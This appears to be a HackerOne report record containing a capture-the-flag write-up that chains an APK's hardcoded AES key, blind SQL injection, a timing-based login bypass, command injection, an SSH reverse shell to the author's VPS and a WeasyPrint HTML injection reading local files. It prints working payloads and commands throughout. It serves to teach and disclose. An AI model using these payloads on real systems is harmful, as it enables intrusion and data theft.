{
  "id": 508123,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDgxMjM=",
  "url": "https://hackerone.com/reports/508123",
  "title": "@ajxchapman 50m-ctf writeup",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2019-03-11T23:40:07.905Z",
  "submitted_at": "2019-03-11T23:40:07.905Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ajxchapman",
    "url": "/ajxchapman",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 38489,
    "url": "https://hackerone.com/50m-ctf",
    "handle": "50m-ctf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "50m-ctf",
      "twitter_handle": null,
      "website": "https://hackerone.com/",
      "about": null
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-04-08T15:55:48.815Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-04-08T15:55:42.787Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# 50m-ctf writeup\n## TL;DR\nFlag is `c8889970d9fb722066f31e804e351993`, thanks for the challenge!\n\n## Introduction\nMy goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a [GitHub Gist](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97) (to be made public after the CTF has concluded and reports published).\n\n## Stage 1 - CTF Announcement Image\nThe H1-702 50m-CTF was announced on Twitter with two images [https://twitter.com/Hacker0x01/status/1100543680383832065](https://twitter.com/Hacker0x01/status/1100543680383832065), an no other details! The implication being that all the details required were included in the tweet.\n\nOf the two images, the first image included the names of many of the top hackers on HackerOne. The second image included a flag (a not so subtle hint maybe?) with a repeating binary code in the background. Decoding this binary code seemed to be the objective of this first clue.\n\nBeing the odd kind of lazy, in that I would prefer to spend hours writing code instead of doing something manually for 20 minutes, I set out to write a script to extract the binary code from the image using character recognition. Initial tests with OCR libraries (tesseract, ocr.space, etc.) did not provide very useful results due to the noise in the image. So I sat down to write a script using the Python Pillow library to do this manually.\n\nThe script ([available here](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py)) went through each line in the image, annotated the identified characters and attempted to determine if a given character was a `1` or a `0` based on the character width (a non-fixed width font was used in the image which helped).\n\nA copy of the annotated image can be seen below:\n{F439682}\n\nThe output was somewhat tricky, as the character extraction was not 100% reliable due to image composition and noise, and no single line included the full output. With a little fiddling, however, the full binary code was easily extracted, and the message decoded:\n* Binary String\n  * `011110100110110001101001011000100010101101111000100111000100101111001010001011001101000101001011110010011101011111001111001100000010110011001001010010000010110111001010000001010000000000100101110100100000010100101001`\n* Decoded into bytes\n  * `'zlib+xK,K0,H-\\x05\\x00%\\x05)'`\n* Zlib decompressed\n  * [bit.do/h1therm](http://bit.do/h1therm)\n* Un-shortened URL\n  * [https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view)\n\nThis provided an Android APK file for download and allowed me to start on the next stage.\n\n#### Tools\n* [image_extract.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py)\n\n### Summary of Issues:\n* Storing sensitive information in plain sight ;-)\n\n## Stage 2 - Android APK\nWithout a spare test Android device to hand I downloaded and ran [Android x86](http://www.android-x86.org/) in a VirtualBox Virtual Machine. Running the `h1thermostat` application downloaded from the previous stage I was greeted with a login screen:\n\n{F439681}\n\nAnalysis of the network traffic from the VM using [Wireshark](https://www.wireshark.org/) showed the `h1thermostat` application sends unencrypted HTTP requests to a server at `35.243.186.41`:\n\n```http\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; VirtualBox Build/OPM8.190105.002)\nHost: 35.243.186.41\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 123\n\nd=aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGg%0At%2F803RyZmSHaMd0KzZPTD%2FdgQlUgoNA%3D%0A&\n```\nWhilst the application did not use TLS to encrypt the entire HTTP session, it appeared that the POST payload was in an encrypted form. In order to decrypt the payload I would have to review the application code.\n\nBreaking out [apktool](https://github.com/iBotPeaches/Apktool), [dex2jar](https://github.com/pxb1988/dex2jar) and [JD-Gui](https://github.com/java-decompiler/jd-gui) to extract the apk, disassemble the Dalvik executable to Java bytecode and decompile the Java bytecode to readable Java, I was able to get a good view of the application source code.\n\nA review of the decompiled source code identified the encryption / decryption functions in `com.hackerone.thermostat.PayloadRequest`:\n```java\nprivate String buildPayload(JSONObject paramJSONObject)\n    throws Exception\n  {\n    SecretKeySpec localSecretKeySpec = new SecretKeySpec(new byte[] { 56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116 }, \"AES\");\n    byte[] arrayOfByte = new byte[16];\n    new SecureRandom().nextBytes(arrayOfByte);\n    Object localObject = new IvParameterSpec(arrayOfByte);\n    Cipher localCipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    localCipher.init(1, localSecretKeySpec, (AlgorithmParameterSpec)localObject);\n    localObject = localCipher.doFinal(paramJSONObject.toString().getBytes());\n    paramJSONObject = new byte[localObject.length + 16];\n    System.arraycopy(arrayOfByte, 0, paramJSONObject, 0, 16);\n    System.arraycopy(localObject, 0, paramJSONObject, 16, localObject.length);\n    return Base64.encodeToString(paramJSONObject, 0);\n  }\n```\n\nThis code snippet shows that the application used AES with Cipher Block Chaining and PKCS5 padding. A static encryption key is used, and a random IV generated which is prepended to the encrypted message before the entire thing is base64 encoded.\n\nDecrypting this with Python gives us:\n```Python\nimport base64\nfrom Crypto.Cipher import AES\n\nkey = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\ndef decrypt(data):\n    def _unpad(s):\n        return s[:-ord(s[len(s)-1:])]\n    data = base64.b64decode(data)\n    iv = data[:16]\n    data = data[16:]\n    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)\n    return _unpad(cipher.decrypt(data)).decode()\n\nprint(decrypt(\"aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGgt/803RyZmSHaMd0KzZPTD/dgQlUgoNA=\"))\n```\n```json\n{\"username\":\"username\",\"password\":\"password\",\"cmd\":\"getTemp\"}\n```\n\nArmed with the ability to encrypt and decrypt payloads I could progress to the next stage!\n\n### Summary of Issues:\n* Hardcoded cryptographic key\n* No TLS and certificate pinning\n\n## Stage 3 - FliteThermostat API\nVisiting the http://35.243.186.41/ site directly gives the error message \"The method is not allowed for the requested URL\" showing that I was dealing with a Python Flask application.\n\nThe first thing I tried was guessing credentials, so I scripted up my encryption / decryption code with Python Requests and started sending username and password combination to the server. Very quickly I come across a valid combination `admin:password`.\n\nPlugging these credentials back into the Android application shows some more, but very limited functionality. I now had the ability to send the `setTemp` command (although it should be noted that this doesn't seem to actually change anything significantly). In order to attempt to increase the application attack surface I set out bruteforcing alternative commands. After a reasonably extensive round of command guessing I came up with only the following commands:\n* getTemp - Gleaned from initial network traffic analysis\n* setTemp - Observed from logging in the the `admin:password` credentials\n* diag - Guessed command, always responding with \"Missing diagnostic parameters\" no matter the parameters I supplied\n\nNoting that there did not appear to be a large attack surface I reviewed what I already knew, and set about looking for other weaknesses. It was at this point I observed that the `username` parameter appeared to be vulnerable to blind SQL injection. The following request payload would happily supply the `getTemp` response as if the actual credentials were supplied, confirming the blind SQL injection vulnerability:\n```json\n{\"username\":\"admi' + (SELECT 'n') +'\", \"password\":\"password\", \"cmd\":\"getTemp\"}\n```\n\nUsing Blind SQLi techniques outlined in one of my old blog posts ([Blind SQL injection optimization](https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html)) I scripted up a tool ([decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py)) to efficiently extract the following information from the database:\n* User: root@localhost\n* Version: 10.1.37_mariadb_0_deb9u1\n* Hostname: de8c6c400a9f\n* Database: flitebackend\n* Tables: Columns\n  * Devices: ID, IP\n  * Users: ID, username, password\n\nIn addition to being able to extract data from the database, I noted that stacked queries were permitted, so I could run my own `INSERT` and `UPDATE` queries on the database. Whilst I did not find this particularly useful, I noticed that this could be abused to re-enable local file access through the `LOAD_FILE` function. `LOAD_FILE` was initially restricted as the database user had the `File_priv` revoked:\n* Load File:\n  * sql_mode: NO_AUTO_CREATE_USER_NO_ENGINE_SUBSTITUTION\n  * local_infile: ON\n  * secure_file_priv: ''\n  * File_priv: N\n\nHowever, as the database user is the root user, and stacked queries were permitted I could re-enable `LOAD_FILE` using the following query:\n```sql\nGRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n```\n\nWith `LOAD_FILE` re-enabled I was able to extract the source code for the FliteThermostat API application from `/app/main.py`, see attachment {main_1.py}! Although this was quite a fun attack vector, it actually didn't lead to any further stages of the CTF.\n\nGoing back to the database, dumping the contents of the `Devices` table shows numerous IP addresses, most from reserved IPv4 ranges. Ignoring the reserved addresses the table included a single publicly routable address which was extracted with the following query using the [decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py) tool:\n```shell\npython3 decrypt_sqli.py --characters \"._1234567890\" \"SELECT CONCAT(ID, '_', IP) from devices WHERE IP not LIKE '2__.%' and IP not LIKE '10.%' and IP not LIKE '192.88.%' ORDER BY ID DESC\"\n```\n```sql\n> SELECT CONCAT(ID, '_', IP) from devices WHERE IP not LIKE '2__.%' and IP not LIKE '10.%' and IP not LIKE '192.88.%' ORDER BY ID DESC\n\n+---------------------+\n| CONCAT(ID, '_', IP) |\n+---------------------+\n| 69_104.196.12.98    |\n+---------------------+\n```\n\nThe extracted address led me to the next stage of the CTF.\n\n#### Tools\n* [decrypt_sqli.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py)\n\n#### Attachments\n* F439687\n\n### Summary of Issues\n* Guessable Credentials\n* Blind SQL Injection\n* Insecure database configuration leading to Local File Disclosure\n\n## Stage 4 - FliteThermostat Backend\n### Stage 4.1 Login\nVisiting the http://104.196.12.98/ application directly showed a login page. Checking a non existing page presented an error message disclosing that once again I was looking at a Python Flask application.\n\nAttempting to log into the application showed that the provided user credentials were hashed in the browser via JavaScript before being sent to the server:\n```http\nPOST / HTTP/1.1\nHost: 104.196.12.98\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://104.196.12.98/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nhash=f6e6530a2b9bad0780df53a03a161f771fecb83a66c184b356330b38bef67dd6\n```\n\nExtracting the JavaScript hashing code in order to pre-compute hashes for various username / password combinations and submitting those hashes did not lead to any results. Guessing application paths only identified pages that redirected to the login page (`/control`, `/diagnostics`, `/main`, `/update`). Unless the credentials were something obscure, I decided there must be another way to bypass the authentication mechanism.\n\nPlaying with the `hash` parameter, I observed that requests with a `hash` length of 64 characters took > 500ms to respond, where as a `hash` length of anything else returned nearly immediately. It looked like the application may been vulnerable to a timing side-channel attack. Sending 256 requests with each possible value for the first byte soon confirmed it, a `hash` of length 64 which started with `f9` took > 1000ms to respond where as all other values took ~500ms to respond.\n\nTiming side-channel attacks are notoriously difficult to exploit, especially so across the internet. In this case I appeared to be luck, the timing difference was easily measurable, approximately 500ms for each successful byte guessed. Even so, there were a number of techniques I used that made getting results more reliable. First, I ran my tests from a server as physically close to the target server as possible. The target was running on Google cloud in one of Google's us-east data centers, so I chose to spin up a VPS in a us-east data center to work from. Secondly, I used HTTP pipelining (a technique inspired by Albinowax's recent [talk on Turbo Intruder](https://www.youtube.com/watch?v=vCpIAsxESFY)) to help minimise TCP connection, send and response delays which would otherwise seriously skew the results. The HTTP pipelining technique I used, sent multiple requests in a single pipeline, and only measured the execution time after a first response was received. Using these techniques in a script, I was able to start getting reliable results.\n\nThe last problem to overcome was the amount of time it was going to take to guess all 32 bytes of a valid hash. Each successfully guessed byte was adding 500ms to the response time, meaning that guessing all 256 possible characters for the 14th byte would take 30 minutes, and over an hour for the 30th byte. One final shortcut was to stop guessing a byte after a result was received which was within an expected time frame for the next byte. This early exit strategy would theoretically reduce the amount of time required by half, but could possibly introduce inconsistency.\n\nAfter getting my script as reliable as possible, and leaving it for an overnight run, I had successfully extracted a valid hash value, `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`, and with this could log into the application.\n\n#### Tools\n* [timing_attack.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-timing_attack-py)\n\n### Stage 4.2 Exploitation\n\nLogging into the application once again gave limited functionality. The most interesting being the `/update` page which appeared to attempt to update the application from the `http://update.flitethermostat:5000/` endpoint, however the update consistently failed with an error \"Could not connect\".\n\nAttempting to bruteforce parameters on each of the application pages using the Burpsuite parameter names wordlist ([burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)) easily identified the `port` parameter on the `/update` page.\n\nChanging the `port` parameter affected the port the update function attempted to use, e.g. a `port` parameter of `888` caused the update check to be performed against the `http://update.flitethermostat:888/` endpoint. This showed I could have some control over the update endpoint, however the port parameter was limited to integer values only, any non integer value caused a 500 error to occur.\n\nHaving found one hidden parameter which could modify the update function, I went looking for one which could let me update the host portion of the update check. Using a larger dictionary of parameters produced no new results, so I concluded if a parameter existed it must be a compound parameter made up of multiple words joined together. I wrote another script to help generate compound wordlists, [wordlist_generator.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py). This script could be used to scrape target URLs to generate an application specific wordlist, and join words from multiple wordlists in various ways and forms (joined with underscores, camelCase, present participle form, etc.). This produced a huge wordlist for me to unleash against the application.\n\nThe next problem was how to submit this vast wordlist to the application in a reasonable amount of time. A single threaded, synchronous, python script was far too slow, and whilst tools do exist (Wfuzz for example), I wanted to stick to my initial goal of using my own tooling. Borrowing some code from [https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/](https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/) and using the Python aiohttp library I wrote a very fast asynchronous request library to use [httplib.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py). This allowed me to easily submit more than 500 requests a second, the only problem now was not DoSing the server!\n\nAfter a while the combined scripts identified the `update_host` parameter, which modified the host portion of the update function. With this and the `port` parameter I had complete control over the update destination. Pointing the `update_host` at a VPS I controlled, I expected to receive an HTTP request from the server, however no request was received. I tried IP addresses, encoded IP addresses, the localhost address, nothing seem to modify the result of the update function, the \"Could not connect\" error was always returned.\n\nEventually I considered that the vulnerability may not be in the update request, but the parameter itself. Soon after this thought, I identified that the parameter was vulnerable to simple command injection using the `$(<command>)` sequence.\n\n```HTTP\nGET /update?update_host=$(echo+Hello+World)198.211.125.160&port=80 HTTP/1.1\nHost: 104.196.12.98\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://104.196.12.98/main\nConnection: close\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIJAHQ.604xiUcoHwNGwnR5oPQ7kq2Rmak\nUpgrade-Insecure-Requests: 1\n```\n\nThis allowed me to move onto the next stage and attempt to further compromise the server.\n\n#### Tools\n* [wordlist_generator.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py)\n* [httplib.py](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py)\n\n### Summary of Issues:\n* Non-constant time credential comparison leading to authentication bypass\n* Unlisted query parameters accessible\n* Command injection\n\n## Stage 5 - System Compromise\nThe first thing I do when getting command injection is to identify the user the command is running as, in this case on a Linux server via the `id` command:\n```shell\nuid=0(root) gid=0(root) groups=0(root)\n```\nWell that was easy, no need to go looking for privilege escalation issues in this instance.\n\nIn order to assist in the assessment of the server I used my [SSHReverseShell](https://github.com/ajxchapman/sshreverseshell) tool, creating new SSH keys on the server using the `ssh-keygen` command, and connecting a reverse ssh shell back to a VPS I controlled. This gave me secure full TTY shell on the compromised server with which to explore further. After finding few files of interest (barring the source code to the previous level of course F439685), I went looking at the network.\n\n```sh\nip address\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\nThis showed that the compromised host was on the `172.27.0.3/16` private network. Using `curl` as a rudimentary portscanner I quickly found that I could only obviously route network traffic to 3 hosts in this network range. Further more I identified HTTP servers on all 3 of the routable hosts.\n\n```sh\nfor i in {1..255}; do for j in 22 80 443; do ERROR=$(curl -sS 172.27.0.$i:$j 2>&1 1>/dev/null); echo -e \"172.27.0.$i:$j\\t${ERROR:-Open}\"; done; done\n\n172.27.0.1:22   curl: (56) Recv failure: Connection reset by peer\n172.27.0.1:80   Open\n172.27.0.1:443  curl: (7) Failed to connect to 172.27.0.1 port 443: Connection refused\n172.27.0.2:22   curl: (7) Failed to connect to 172.27.0.2 port 22: Connection refused\n172.27.0.2:80   Open\n172.27.0.2:443  curl: (7) Failed to connect to 172.27.0.2 port 443: Connection refused\n172.27.0.3:22   curl: (7) Failed to connect to 172.27.0.3 port 22: Connection refused\n172.27.0.3:80   Open\n172.27.0.3:443  curl: (7) Failed to connect to 172.27.0.3 port 443: Connection refused\n172.27.0.4:22   curl: (7) Failed to connect to 172.27.0.4 port 22: No route to host\n172.27.0.4:80   curl: (7) Failed to connect to 172.27.0.4 port 80: No route to host\n172.27.0.4:443  curl: (7) Failed to connect to 172.27.0.4 port 443: No route to host\n172.27.0.5:22   curl: (7) Failed to connect to 172.27.0.5 port 22: No route to host\n172.27.0.5:80   curl: (7) Failed to connect to 172.27.0.5 port 80: No route to host\n172.27.0.5:443  curl: (7) Failed to connect to 172.27.0.5 port 443: No route to host\n172.27.0.6:22   curl: (7) Failed to connect to 172.27.0.6 port 22: No route to host\n...\n```\n\n{F439680}\n\nA quick check with `curl` showed that the webservers on two of the IP addresses were pointing at the previous FliteThermostat Backend application, whilst the 3rd was hosting a new application, and the next stage of the CTF.\n\nUsing SSH to reverse tunnel traffic through the compromised host to the new web server I could access the new application from my browser:\n```sh\nssh -N -R 8001:172.27.0.2:80 -o \"StrictHostKeyChecking no\" -o \"UserKnownHostsFile /dev/null\" <user>@<server>\n```\n{F439676}\n\n\n#### Attachments\n* F439685\n\n#### Tools\n* [SSHReverseShell](https://github.com/ajxchapman/sshreverseshell)\n\n### Summary of Issues\n* Web application running as root user\n* Insufficient network segregation\n\n## Stage 6 - HackerOne Accounting Application\nTunnelling through to the compromised host at http://172.27.0.2:80 provided access to YAPFA (Yet Another Python Flask Application).\n\nAccessing each of the available links of the application presented a login page. Reviewing the login page it appeared that the `password` parameter was vulnerable to some form of injection. Adding the tick character `'` the application responded with a HTTP 500 error, adding two in a row `''` the application returned a 200 status. However, there were oddities in this behaviour, for example a password value of `pas'sw'ord` also returned a 200 status, where a 500 error would be expected on a real injection vulnerability. This indicated there was something odd going on with this parameter, but it definitely was not a straight forward SQL or NoSQL injection.\n\nFurther analysis of the application HTML identified a commented out link on the `/invoices` page:\n```html\n<!--<li  class=\"nav-item\" >\n\t<a class=\"nav-link\" href=\"/invoices/new\">New Invoice</a>\n</li>-->\n```\n\nAccessing this page presented application functionality instead of the expected login form. This application page allowed the preparation of invoices, previewing them in HTML format or downloading them as PDFs.\n\n```http\nGET /invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://127.0.0.1:8001/invoices/new\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\nThe obvious first step was to go looking for HTML injection issues with a goal of being able to have the PDF renderer parse arbitrary HTML. Luckily I found one quite easily in sub-parameters of the `styles` JSON parameter. These parameters allowed the injection of all of the characters needed for HTML injection, `<>'= /`, e.g. `\"styles\":{\"htmlinjection\":{\"<b>Test Injection\":\"\"}`, which would result in `<b>Test Injection` being returned within a `<style>` tag in the PDF preview.\n\nThis had one caveat, closing tags appeared to be stripped. In order to render injected HTML I needed to break out of the `<style>` tag the content was rendered in, but simply adding a closing tag `</style>` did not work. A common issue with input sanitization is not recursively sanitizing the input. In this case, any tag which matched the regular expression `</[A-Za-z]+>` appeared to be stripped, however, this could be bypassed by embedding one closing tag within another, e.g. `</</x>style>` when sanitized would result in `</style>`, which is what was needed.\n\nWith the ability to inject arbitrary HTML into the PDF renderer, the next step was to try and exploit the PDF renderer itself. Common HTML rendering vulnerabilities include local file disclosure, and this was the issue I went looking for. I quickly identified that images on the local filesystem could be included in generated PDFs with a payload of `</</x>style><img+src='file:///usr/lib/python3.5/idlelib/Icons/idle_16.png'+/>`, however methods commonly used for LFD were not working (`<iframe>`, `<embed>`, `<object>`, etc.) and injected JavaScript was not being executed. I also noticed that the PDFs had an embedded `/Creator` and `/Producer` tag of `cairo 1.14.8 (http://cairographics.org)`.\n\nGoogling for common PDF rendering engines gave numerous results (xhtml2pdf, pdfcrowd, pdfkit, etc.), however only one seemed to fit the constraints identified above, WeasyPrint. This was confirmed by attempting to render an image from a remote server under my control with the payload `</</x>style><img+src='http://images.example.com'+/>`:\n```access.log\nINFO - \"104.196.12.98\" - http://images.example.com:80 [11/Mar/2019:12:03:36 +0000] \"GET / HTTP/1.1\" 200 161 \"-\" \"WeasyPrint 44 (http://weasyprint.org/)\"\n```\n\n[WeasyPrint](https://github.com/Kozea/WeasyPrint) is an open source Python HTML to PDF library, so I went looking through the source code on GitHub. First thing that I noticed was this little gem from their documentation\n\n> When used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.\n\nhttps://github.com/Kozea/WeasyPrint/blob/master/docs/tutorial.rst\n\nAuditing the WeasyPrint source I quickly found the following interesting code comment:\n```python\n#: File attachments, as a list of tuples of URL and a description or\n#: :obj:`None`. (Defaults to the empty list.)\n#: Extracted from the ``<link rel=attachment>`` elements in HTML\n#: and written to the ``/EmbeddedFiles`` dictionary in PDF.\n#:\n#: .. versionadded:: 0.22\nself.attachments = attachments or []\n```\n`/weasyprint/document.py:319`\n\nThis strongly suggested that if I injected a `<link rel=\"attachment\" href=\"URL\">` tag, the URL pointed to by the `href` attributed would be embedded in the generated PDF document in an `/EmbeddedFile` stream. Further review of the source code confirmed this.\n```python\nelif element.tag == 'link' and element_has_link_type(\n        element, 'attachment'):\n    url = get_url_attribute(element, 'href', base_url)\n    title = element.get('title', None)\n    if url is None:\n        LOGGER.error('Missing href in <link rel=\"attachment\">')\n    else:\n        attachments.append((url, title))\n```\n`/weasyprint/html.py:307`\n\n```python\ndef _write_pdf_embedded_files(pdf, attachments, url_fetcher):\n    \"\"\"Write attachments as embedded files (document attachments).\n    :return:\n        the object number of the name dictionary or :obj:`None`\n    \"\"\"\n    file_spec_ids = []\n    for attachment in attachments:\n        file_spec_id = _write_pdf_attachment(pdf, attachment, url_fetcher)\n```\n`/weasyprint/pdf.py:416`\n\nFinally, trying it out for real with the payload `</</x>style><link+rel='attachment'+href='file:///app/main.py'>` confirmed the contents of the file was included in an `/EmbeddedFile` stream, and could be extracted through the FireFox PDF renderer to view the contents.\n\n{F439677}\n\nGaining access to the `/app/main.py` file in this stage was the final flag in this CTF!\n\n#### Attachments:\n* F439686\n* F439678\n\n### Summary of Issues:\n* HTML injection via insufficient input validation and sanitization\n* PDF rendering Local File Disclosure\n\n# Closing thoughts\nWhilst the narrative presented here is the most direct route I *could* have taken to complete this CTF, it does gloss over the many hours of failure, rabbit holes dived into and red herrings chased. It specifically does not mention the many millions of requests made in vain whist attempting to guess query string parameters. It 100% ignores the day spent attempting to perform a timing attack to guess single characters at a time (instead of bytes). And it fails to reveal the full time spent scripting up character recognition when a pen and paper would have done the job just as well in less than 1/10 of the time.\n\nI learned a huge amount participating, and failing hard, in this CTF and fortified my toolkit with many new and revised tools ([available here for you to try too](https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97)). Thanks to @Hacker0x01 and @daeken for putting this challenge together!\n\n## Impact\n\nFlag is `c8889970d9fb722066f31e804e351993`, thanks for the challenge!",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 439676,
      "file_name": "application.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/676/56bffd9ef1bb9c165010175dbbf23ab08e841add/application.png?response-content-disposition=attachment%3B%20filename%3D%22application.png%22%3B%20filename%2A%3DUTF-8%27%27application.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074420Z&X-Amz-Expires=1969&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2